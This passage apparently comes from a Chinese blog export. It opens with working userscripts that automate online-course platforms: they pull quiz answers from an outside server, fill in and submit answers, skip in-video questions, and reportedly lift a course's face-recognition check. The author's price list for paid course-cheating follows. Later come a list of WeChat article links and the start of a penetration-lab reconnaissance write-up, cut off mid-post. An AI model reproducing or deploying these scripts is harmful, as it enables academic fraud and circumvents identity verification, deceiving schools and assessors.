class="line">    &#125;).get().join(<span class="string">'#'</span>);</span><br><span class="line">    GM_xmlhttpRequest(&#123;</span><br><span class="line">        method: <span class="string">'POST'</span>,</span><br><span class="line">        url: <span class="string">'http://mooc.forestpolice.org/cx/'</span> + (setting.token || <span class="number">0</span>) + <span class="string">'/'</span> + <span class="built_in">encodeURIComponent</span>(question),</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">'Content-type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        data: <span class="string">'course='</span> + <span class="built_in">encodeURIComponent</span>(setting.curs) + <span class="string">'&amp;type='</span> + type + <span class="string">'&amp;option='</span> + <span class="built_in">encodeURIComponent</span>(option),</span><br><span class="line">        timeout: setting.time,</span><br><span class="line">        onload: <span class="function"><span class="keyword">function</span>(<span class="params">xhr</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!setting.loop) &#123;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> obj = $.parseJSON(xhr.responseText);</span><br><span class="line">                <span class="keyword">if</span> (obj.code) &#123;</span><br><span class="line">                    setting.div.children(<span class="string">'div:eq(0)'</span>).text(<span class="string">'正在搜索答案...'</span>);</span><br><span class="line">                    $(</span><br><span class="line">                        <span class="string">'&lt;tr&gt;'</span> +</span><br><span class="line">                            <span class="string">'&lt;td&gt;'</span> + question + <span class="string">'&lt;/td&gt;'</span> +</span><br><span class="line">                            <span class="string">'&lt;td&gt;'</span> + obj.data + <span class="string">'&lt;/td&gt;'</span> +</span><br><span class="line">                        <span class="string">'&lt;/tr&gt;'</span></span><br><span class="line">                    ).appendTo(setting.div.find(<span class="string">'tbody'</span>)).css(<span class="string">'background-color'</span>, fillAnswer($TiMu, obj, type) ? <span class="string">''</span> : <span class="string">'rgba(0, 150, 136, 0.6)'</span>);</span><br><span class="line">                    setting.num++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    setting.div.children(<span class="string">'div:eq(0)'</span>).text(obj.data || <span class="string">'服务器繁忙，正在重试...'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                setting.div.children(<span class="string">'span'</span>).html(obj.msg || <span class="string">''</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (xhr.status == <span class="number">403</span>) &#123;</span><br><span class="line">                setting.div.children(<span class="string">'button'</span>).eq(<span class="number">0</span>).click();</span><br><span class="line">                setting.div.children(<span class="string">'div:eq(0)'</span>).text(<span class="string">'请求过于频繁，建议稍后再试'</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                setting.div.children(<span class="string">'div:eq(0)'</span>).text(<span class="string">'服务器异常，正在重试...'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        ontimeout: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            setting.loop &amp;&amp; setting.div.children(<span class="string">'div:eq(0)'</span>).text(<span class="string">'服务器超时，正在重试...'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillAnswer</span>(<span class="params">$TiMu, obj, type</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $li = $TiMu.find(<span class="string">'ul:eq(0) li'</span>),</span><br><span class="line">    data = <span class="built_in">String</span>(obj.data).split(<span class="string">'#'</span>),</span><br><span class="line">    state = setting.lose;</span><br><span class="line">    <span class="comment">// $li.find(':radio:checked').prop('checked', false);</span></span><br><span class="line">    obj.code == <span class="number">1</span> &amp;&amp; $li.each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $input = $(<span class="keyword">this</span>).find(<span class="string">'input'</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (!$input) &#123;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($input.value == <span class="string">'true'</span>) &#123;</span><br><span class="line">            ($.inArray(<span class="string">'正确'</span>, data) + <span class="number">1</span> || $.inArray(<span class="string">'是'</span>, data) + <span class="number">1</span>) &amp;&amp; $input.click();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($input.value == <span class="string">'false'</span>) &#123;</span><br><span class="line">            ($.inArray(<span class="string">'错误'</span>, data) + <span class="number">1</span> || $.inArray(<span class="string">'否'</span>, data) + <span class="number">1</span>) &amp;&amp; $input.click();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> tip = $(<span class="keyword">this</span>).find(<span class="string">'.after'</span>).text().trim() || <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            ($.inArray(tip, data) + <span class="number">1</span> || (type == <span class="string">'1'</span> &amp;&amp; obj.data.indexOf(tip) + <span class="number">1</span>)) == $input.checked || $input.click();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (type.match(<span class="regexp">/^(0|1|3)$/</span>)) &#123;</span><br><span class="line">        $li.find(<span class="string">'input:checked'</span>).length || (setting.none ? $li.find(<span class="string">'input'</span>)[<span class="number">0</span>].click() : setting.lose++);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($TiMu.find(<span class="string">'ul:eq(0) textarea'</span>).length) &#123;</span><br><span class="line">        (obj.code == <span class="number">1</span> &amp;&amp; data.length == $li.length) || setting.none || setting.lose++;</span><br><span class="line">        UE &amp;&amp; $li.each(<span class="function"><span class="keyword">function</span>(<span class="params">index, dom</span>) </span>&#123;</span><br><span class="line">            data[index] = state == setting.lose ? (obj.code == <span class="number">1</span> &amp;&amp; data[index]) || <span class="string">'不会'</span> : <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">var</span> $input = $(<span class="keyword">this</span>).find(<span class="string">'.inp'</span>);</span><br><span class="line">            $input.is(<span class="string">':hidden'</span>) ? (dom = $(<span class="keyword">this</span>).next()) : $input.val(data[index]);</span><br><span class="line">            <span class="keyword">var</span> $edit = $(dom).find(<span class="string">'.edui-default + textarea'</span>);</span><br><span class="line">            $edit.length &amp;&amp; UE.getEditor($edit.attr(<span class="string">'name'</span>)).setContent(data[index]);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        setting.none || setting.lose++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> state == setting.lose;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitThis</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (setting.auto &amp;&amp; $(<span class="string">'#validate'</span>, top.document).is(<span class="string">':hidden'</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($(<span class="string">'#confirmSubWin'</span>).is(<span class="string">':hidden'</span>)) &#123;</span><br><span class="line">            $(<span class="string">'.Btn_blue_1'</span>)[<span class="number">0</span>].click();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> $btn = $(<span class="string">'#tipContent'</span>).next().children(<span class="string">':first'</span>),</span><br><span class="line">            position = $btn.offset(),</span><br><span class="line">            mouse = <span class="built_in">document</span>.createEvent(<span class="string">'MouseEvents'</span>);</span><br><span class="line">            position = [position.left + <span class="built_in">Math</span>.floor(<span class="number">46</span> * <span class="built_in">Math</span>.random() + <span class="number">1</span>), position.top + <span class="built_in">Math</span>.floor(<span class="number">26</span> * <span class="built_in">Math</span>.random() + <span class="number">1</span>)];</span><br><span class="line">            mouse.initMouseEvent(<span class="string">'click'</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="built_in">document</span>.defaultView, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, position[<span class="number">0</span>], position[<span class="number">1</span>], <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="literal">null</span>);</span><br><span class="line">            $btn[<span class="number">0</span>].dispatchEvent(mouse);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(submitThis, setting.time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkToNext</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $tip = $(<span class="string">'.ans-job-icon'</span>, <span class="built_in">document</span>);</span><br><span class="line">    <span class="keyword">if</span> (!setting.check) &#123;</span><br><span class="line">        $tip = $tip.next(<span class="string">'iframe[src*="/video/index.html"], iframe[src*="/work/index.html"]'</span>).prev();</span><br><span class="line">    &#125;</span><br><span class="line">    setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$tip.parent(<span class="string">':not(.ans-job-finished)'</span>).length) &#123;</span><br><span class="line">            toNext();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, setting.time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toNext</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $tip = $(<span class="string">'span.currents ~ span'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!setting.jump) &#123;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($(<span class="string">'.lock, .blue'</span>, <span class="string">'.currents:header'</span>).length || !$tip.length) &#123;</span><br><span class="line">        $tip = $(<span class="string">'.roundpointStudent, .roundpoint'</span>).parent();</span><br><span class="line">        <span class="keyword">var</span> index = $tip.index($tip.filter(<span class="string">'.currents:header'</span>));</span><br><span class="line">        $tip.slice(index + <span class="number">1</span>).not(<span class="string">':has(.lock, .blue)'</span>).eq(<span class="number">0</span>).click().length || setting.course &amp;&amp; switchCourse();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $tip.eq(<span class="number">0</span>).click();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">switchCourse</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    GM_xmlhttpRequest(&#123;</span><br><span class="line">        method: <span class="string">'GET'</span>,</span><br><span class="line">        url: <span class="string">'/visit/courses/study?isAjax=true&amp;fileId=0&amp;debug='</span>,</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">'Referer'</span>: location.origin + <span class="string">'/visit/courses'</span>,</span><br><span class="line">            <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        onload: <span class="function"><span class="keyword">function</span>(<span class="params">xhr</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> list = $(xhr.responseText).find(<span class="string">'li[style] a:has(img)'</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $(<span class="keyword">this</span>).attr(<span class="string">'href'</span>);</span><br><span class="line">            &#125;),</span><br><span class="line">            index = list.map(<span class="function"><span class="keyword">function</span>(<span class="params">index</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.indexOf(top.courseId) &gt; <span class="number">-1</span> &amp;&amp; index;</span><br><span class="line">            &#125;).filter(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $.isNumeric(<span class="keyword">this</span>);</span><br><span class="line">            &#125;)[<span class="number">0</span>] + <span class="number">1</span> || <span class="number">0</span>;</span><br><span class="line">            setting.course = list[index] ? $.globalEval(<span class="string">'location.replace("'</span> + list[index] + <span class="string">'")'</span>) : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goCourse</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> jump = setting.course &amp;&amp; <span class="built_in">document</span>.referrer.match(<span class="regexp">/\/knowledge\/cards|\/mycourse\/studentstudy/</span>);</span><br><span class="line">    jump &amp;&amp; setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">'.articlename a[href]:not([class])'</span>)[<span class="number">0</span>].click();</span><br><span class="line">    &#125;, setting.time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DisplayURL</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'.zmodel'</span>).on(<span class="string">'click'</span>, <span class="string">'[onclick^=openFaceTip]'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        _self.WAY.box.hide();</span><br><span class="line">        <span class="keyword">var</span> $li = $(<span class="keyword">this</span>).closest(<span class="string">'li'</span>);</span><br><span class="line">        $.<span class="keyword">get</span>('/visit/goToCourseByFace', &#123;</span><br><span class="line">            courseId: $li.find(<span class="string">'input[name=courseId]'</span>).val(),</span><br><span class="line">            clazzId: $li.find(<span class="string">'input[name=classId]'</span>).val()</span><br><span class="line">        &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            $li.find(<span class="string">'[onclick^=openFaceTip]'</span>).removeAttr(<span class="string">'onclick'</span>).attr(&#123;</span><br><span class="line">                href: $(data).filter(<span class="string">'script:last'</span>).text().match(<span class="regexp">/n\("(.+?)"/</span>)[<span class="number">1</span>],</span><br><span class="line">                target: <span class="string">'_blank'</span></span><br><span class="line">            &#125;);</span><br><span class="line">            alert(<span class="string">'本课程已临时解除面部识别'</span>);</span><br><span class="line">        &#125;, <span class="string">'html'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSchoolId</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.getJSON(<span class="string">'/org/searchUnis?filter='</span> + <span class="built_in">encodeURI</span>(setting.school) + <span class="string">'&amp;product=44'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (data.result) &#123;</span><br><span class="line">            <span class="keyword">var</span> msg = $.grep(data.froms, <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> value.name == setting.school;</span><br><span class="line">            &#125;)[<span class="number">0</span>];</span><br><span class="line">            msg ? setTimeout(toLogin, setting.time, msg.schoolid) : alert(<span class="string">'学校名称不完整'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            alert(<span class="string">'学校查询错误'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toLogin</span>(<span class="params">fid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ref = $(<span class="string">'#ref, #refer_0x001'</span>).val();</span><br><span class="line">    $.post(<span class="string">'/login6?refer='</span> + ref, &#123;</span><br><span class="line">        fid: fid,</span><br><span class="line">        uname: setting.username,</span><br><span class="line">        password: setting.password,</span><br><span class="line">        logintype: <span class="number">1</span></span><br><span class="line">    &#125;).always(<span class="function"><span class="keyword">function</span>(<span class="params">data, event</span>) </span>&#123;</span><br><span class="line">        event == <span class="string">'success'</span> ? alert($(data).find(<span class="string">'#show_error'</span>).text()) : location.href = <span class="built_in">decodeURIComponent</span>(ref);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="知到智慧树刷课脚本-console使用无跳题"><a href="#知到智慧树刷课脚本-console使用无跳题" class="headerlink" title="知到智慧树刷课脚本(console使用无跳题)"></a>知到智慧树刷课脚本(console使用无跳题)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ti=$(<span class="string">"body"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> video=$(<span class="string">".catalogue_ul1 li[id*=video-]"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">video.css(<span class="string">"color"</span>,<span class="string">"blue"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"已选取"</span>+video.length+<span class="string">"个小节,并已用蓝色标明,请检查是否有遗漏,如有遗漏,概不负责"</span>);</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">$(<span class="string">'.speedTab15'</span>).click();</span><br><span class="line"></span><br><span class="line">$(<span class="string">'.volumeIcon'</span>).click();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"已进行静音和1.5倍加速"</span>);</span><br><span class="line"></span><br><span class="line">&#125;,<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">ti.on(<span class="string">"DOMNodeInserted"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(e.target.textContent==<span class="string">"关闭"</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"检测到第"</span>+i+<span class="string">"个弹题窗口"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">$(<span class="string">".popbtn_cancel"</span>).click();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"已关闭"</span>);</span><br><span class="line"></span><br><span class="line">&#125;,<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">i++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(e.target.textContent==<span class="string">"本节视频,累计观看时间『100%』"</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"检测到视频观看完成，准备跳到下一节"</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">'.next_lesson_bg'</span>).find(<span class="string">'a'</span>).trigger(<span class="string">'click'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"已跳转"</span>);</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">$(<span class="string">'.volumeIcon'</span>).click();</span><br><span class="line"></span><br><span class="line">$(<span class="string">'.speedTab15'</span>).click();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"已进行静音和1.5倍加速"</span>);</span><br><span class="line"></span><br><span class="line">&#125;,<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line">v++;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"目前播放了"</span>+v+<span class="string">"个视频"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="chrome油猴插件下载"><a href="#chrome油猴插件下载" class="headerlink" title="chrome油猴插件下载"></a>chrome油猴插件下载</h2><p>链接：<a href="https://pan.baidu.com/s/1cPk0GsV9aJLNab7RNKjwxg" target="_blank" rel="noopener">百度网盘</a><br>提取码：xstj </p>
<h2 id="chrome脱离页面自动滚屏插件下载"><a href="#chrome脱离页面自动滚屏插件下载" class="headerlink" title="chrome脱离页面自动滚屏插件下载"></a>chrome脱离页面自动滚屏插件下载</h2><p>链接：<a href="https://pan.baidu.com/s/1sYxCeuaOr1eBgE2B6DV2OQ" target="_blank" rel="noopener">百度网盘</a><br>提取码：i0uu </p>
<h2 id="常用搜题网址"><a href="#常用搜题网址" class="headerlink" title="常用搜题网址"></a>常用搜题网址</h2><p><a href="http://www.daanzhijia.com/" target="_blank" rel="noopener">答案之家</a><br>净网行动中封了一次,这是重开的,题库较多但麻烦的是一分钟回帖间隔</p>
<p><a href="http://www.quchap.cn/wangye.php" target="_blank" rel="noopener">quchap小站</a><br>不太稳定,题库没有答案之家多,但是快和简约</p>
<p><a href="https://www.ppkao.com/" target="_blank" rel="noopener">考试资料网</a><br>题库最全,收费也还合理,适合在近期末的一个月时开通</p>
<p>其他的还有百度文库、上学吧等,总之不会的就百度</p>
<h2 id="我的收费表"><a href="#我的收费表" class="headerlink" title="我的收费表"></a>我的收费表</h2><p>学习通包刷视频/单元测验/考试,单科100任务点内10r,100+任务点15r<br>知到智慧树包刷视频/单元测验/见面课/考试,单科10r<br>三三制微课堂包刷视频/单元测验/考试,单科10r</p>
<p>组团三人以上八折,老客户八折,均刷完会通知</p>
]]></content>
      
        <categories>
            
            <category> 工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 刷课 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[大一学期写的推文合集]]></title>
      <url>/%E6%97%A5%E5%B8%B8/ckwd5wsa2005rd0uc5vkalv1c/</url>
      <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s/AJsWEODRV4C59vqA4xfXqQ" target="_blank" rel="noopener">【极客学院】你所不了解的PowerPoint抠图大法！</a><br><a href="https://mp.weixin.qq.com/s/wBkzd5oFois0VSl9sgfXpw" target="_blank" rel="noopener">【极客学院】来一套Adobe系列全家桶？</a><br><a href="https://mp.weixin.qq.com/s/u10VlfF7VTqAFBF0tvE2eA" target="_blank" rel="noopener">【极客学院】音频后期的小科普~</a><br><a href="https://mp.weixin.qq.com/s/uwF2hO1U9U55EbMn1jB1Qw" target="_blank" rel="noopener">【极客学院】一些让手机显得高大上的APP</a><br><a href="https://mp.weixin.qq.com/s/pH7KYgVHanDZihP-B5gi7w" target="_blank" rel="noopener">【极客学院】把Adobe搬回家吧！</a><br><a href="https://mp.weixin.qq.com/s/13E3m-62BkmGyJHCb3L-FQ" target="_blank" rel="noopener">【极客学院】手把手教你撩妹撩汉技巧！</a><br><a href="https://mp.weixin.qq.com/s/deAv6TK3Jg6I3BFQT4mEDA" target="_blank" rel="noopener">【极客学院】教你做专属表情包！</a><br><a href="https://mp.weixin.qq.com/s/v0EvbKWl3cmLJbdz7XeKJQ" target="_blank" rel="noopener">【超级福利】免费看VIP视频的N种姿势（一）</a><br><a href="https://mp.weixin.qq.com/s/OYh5KdF9SI_JEYYfrnyuog" target="_blank" rel="noopener">【极客学院】那些埋没在信息流中的金子（二）</a><br><a href="https://mp.weixin.qq.com/s/lsatm7-3e4KSsdqKZSykcg" target="_blank" rel="noopener">【极客学院】如何让电脑强制出现蓝屏（三）</a><br><a href="https://mp.weixin.qq.com/s/pXozthwIhg2qNza2oitP6Q" target="_blank" rel="noopener">【极客学院】Ae你最需要知道的警告解决方案（四）</a><br><a href="https://mp.weixin.qq.com/s/M14JoP9SE4HWId2CjxxPyg" target="_blank" rel="noopener">【极客学院】你最爱的写作语言Markdown（五）</a><br><a href="https://mp.weixin.qq.com/s/sfbo3OeQ3Cc3tXwgjJR7tQ" target="_blank" rel="noopener">【极客学院】Linux操作系统真香（六）</a><br><a href="https://mp.weixin.qq.com/s/JdXn_YH5ilGGnFBNFAoJLw" target="_blank" rel="noopener">【极客学院】如何制作微信小程序（七）</a><br><a href="https://mp.weixin.qq.com/s/HoWrkjLRaoL_JaccPtbmPQ" target="_blank" rel="noopener">【极客学院】浏览器强大的控制台功能（八）</a><br><a href="https://mp.weixin.qq.com/s/LMqP531ru2qCeOutJcNB6g" target="_blank" rel="noopener">【极客学院】教你ps做千人成像（九）</a><br><a href="https://mp.weixin.qq.com/s/nf6MVKGm1FMeu1ZixaHvdQ" target="_blank" rel="noopener">【极客学院】怎样用ps制作玻璃球特效（十）</a><br><a href="https://mp.weixin.qq.com/s/IW5CdRADK8ht-pJRotbw2w" target="_blank" rel="noopener">【极客学院】教你正确查找可商用素材（十一）</a><br><a href="https://mp.weixin.qq.com/s/wjyQwZ3s5ZJBq6nGXXn3yQ" target="_blank" rel="noopener">【极客学院】ps做简单的雪花效果（十二）</a></p>
]]></content>
      
        <categories>
            
            <category> 日常 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 推文 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[63靶场渗透]]></title>
      <url>/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ckwd5ws6t000xd0uc0iiov2pk/</url>
      <content type="html"><![CDATA[<p>看源码，没啥信息，御剑扫一波，包含phpmyadmin和phpinfo（）漏洞<br><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>nmap扫一波，后面慢慢看<br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>看robots.txt.，进文件目录看<br><figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>发现文件目录，在/backnode_files/目录下没啥重要的东西，换一个工具来扫目录<br> dirbuster扫描出了wordpress目录<br><figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>进去看看，是一个文章日志页面，试在search里执行命令，没整出啥来<br><figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>然后回头看看端口，nmap扫出的3306端口用的是smb协议<br><figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>看到主机名一类的东西，想到enum枚举信息收集工具，能扫出主机信息，但是在windows下扫的结果好像没啥建设性的东西（也可能是我不会用，百度也没找到办法，这个扫出来的应该是我主机的信息）<br><figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>然后因为3306端口是smb协议，在ubuntu下可以用samba工具实现文件共享<br><figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>需要打开的端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1）Port 137 (UDP) - NetBIOS 名字服务 ； nmbd</span><br><span class="line">2）Port 138 (UDP) - NetBIOS 数据报服务</span><br><span class="line">3）Port 139 (TCP) - 文件和打印共享 ； smbd （基于SMB(Server Message Block)协议，主要在局域网中使用，文件共享协议）</span><br><span class="line">4）Port 389 (TCP) - 用于 LDAP (Active Directory Mode)</span><br><span class="line">5）Port 445 (TCP) - NetBIOS服务在windos 2000及以后版本使用此端口, (Common Internet File System，CIFS，它是SMB协议扩展到Internet后，实现Internet文件共享)</span><br><span class="line">6）Port 901 (TCP) - 用于 SWAT，用于网页管理Samba</span><br></pre></td></tr></table></figure></p>
<p>再用tsclient连接windows  参考：<a href="https://www.watchingthenet.com/how-to-connect-to-a-windows-terminal-server-from-ubuntu.html" target="_blank" rel="noopener">https://www.watchingthenet.com/how-to-connect-to-a-windows-terminal-server-from-ubuntu.html</a><br>（事实证明是做了多余的事儿，本没必要，但也学到了不会的东西）<br>在ubuntu下使用smbclient查看默认共享文件，期间遇到ubuntu系统无法访问外部服务器的问题<br><figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>至今没找到解决办法，借了boyfriend的机子smbclient了一下<br><figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>发现开启了share文件夹的共享，windows连上去<br><figure class="image-box">
